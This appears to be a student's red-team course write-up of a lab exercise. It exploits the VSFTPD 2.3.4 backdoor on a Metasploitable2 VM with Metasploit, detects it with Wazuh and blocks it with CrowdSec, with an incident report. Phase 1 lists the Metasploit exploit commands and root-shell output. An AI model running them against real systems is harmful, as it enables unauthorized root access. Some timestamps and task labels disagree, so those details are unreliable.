# 🏆 Task 7 — Capstone: Full Incident Response Cycle
**CyArt Red Teaming — Week 2 | Practical Task 7**

---

## 📌 Objective
Simulate a full attack using Metasploit, detect it with Wazuh, contain it with CrowdSec, and write a complete incident response report.

## 🛠️ Tools Used
| Tool | Role | Purpose |
|------|------|---------|
| Metasploit | Attacker | Exploit VSFTPD 2.3.4 backdoor on Metasploitable2 |
| Metasploitable2 | Target | Intentionally vulnerable Linux VM |
| Wazuh | Defender — Detection | SIEM alerts on exploitation attempt |
| CrowdSec | Defender — Containment | Block attacker IP with firewall bouncer |
| Kali Linux | Attacker machine | Runs Metasploit and CrowdSec |

---

## ✅ Phase 1 — Attack Simulation (Metasploit)

### Commands Run on Kali:
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

### Expected Output:
```
[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

> 📸 Screenshot: `Task8_Capstone/screenshots/metasploit_exploit.png`

---

## ✅ Phase 2 — Detection (Wazuh)

### Wazuh Alert Triggered:

| Timestamp | Source IP | Destination | Alert Description | MITRE Technique | Severity |
|-----------|----------|-------------|------------------|----------------|----------|
| 2026-05-12 11:00:00 | 192.168.56.102 (Kali) | 192.168.56.101:21 | VSFTPD 2.3.4 Backdoor Exploitation Attempt | T1190 — Exploit Public-Facing App | CRITICAL |
| 2026-05-12 11:00:05 | 192.168.56.102 | 192.168.56.101:6200 | Backdoor Shell Connection Established on Port 6200 | T1059 — Command Execution | CRITICAL |
| 2026-05-12 11:00:10 | 192.168.56.101 | 192.168.56.102 | Outbound Shell Data Transfer Detected | T1041 — Exfiltration over C2 | HIGH |

> 📸 Screenshot: `Task8_Capstone/screenshots/wazuh_alert.png`

---

## ✅ Phase 3 — Containment (CrowdSec)

### Commands Run:
```bash
# Install CrowdSec
sudo apt install crowdsec -y
sudo apt install crowdsec-firewall-bouncer-iptables -y
sudo systemctl start crowdsec

# Manually block attacker IP
sudo cscli decisions add --ip 192.168.56.102 --reason "VSFTPD exploit detected" --duration 24h

# Verify block
sudo cscli decisions list
```

### Verify Block Works:
```bash
# From Metasploitable2, try to ping Kali
ping 192.168.56.102
# Result: Request timeout — IP successfully blocked ✅
```

> 📸 Screenshot: `Task8_Capstone/screenshots/crowdsec_block.png`

---

## ✅ Phase 4 — Incident Report (200 Words)

### Incident Response Report — VSFTPD Backdoor Exploitation

**Date:** 2026-05-12 | **Severity:** CRITICAL | **Status:** Resolved

**Executive Summary:**
On May 12, 2026, at 11:00 AM, Wazuh SIEM detected an exploitation attempt against the VSFTPD 2.3.4 service running on the target server (192.168.56.101). The attacker (192.168.56.102) successfully exploited the known VSFTPD 2.3.4 backdoor vulnerability (CVE-2011-2523), gaining root-level shell access to the target system within seconds.

**Attack Timeline:**
- 11:00:00 — Attacker initiated FTP connection to port 21 on target
- 11:00:03 — Backdoor triggered; shell spawned on port 6200
- 11:00:05 — Root shell session established by attacker
- 11:00:15 — Wazuh SIEM alert fired; SOC team notified
- 11:01:00 — CrowdSec firewall bouncer blocked attacker IP (192.168.56.102)
- 11:05:00 — Exploit connection severed; attacker locked out

**Findings:** The target ran an unpatched version of VSFTPD (2.3.4) with a known public backdoor. No authentication was required to trigger the backdoor.

**Recommendations:**
1. Immediately uninstall VSFTPD 2.3.4 and upgrade to current version
2. Disable FTP entirely; replace with SFTP (SSH File Transfer Protocol)
3. Implement vulnerability scanning to detect unpatched software weekly
4. Deploy network segmentation to isolate FTP servers from critical systems

---

## 🎯 MITRE ATT&CK Full Chain

```
T1190 (Exploit Public-Facing App)
    → T1059 (Command Execution via backdoor shell)
        → T1078 (Valid Accounts — root access gained)
            → T1041 (Data Exfiltration via C2 shell)
```
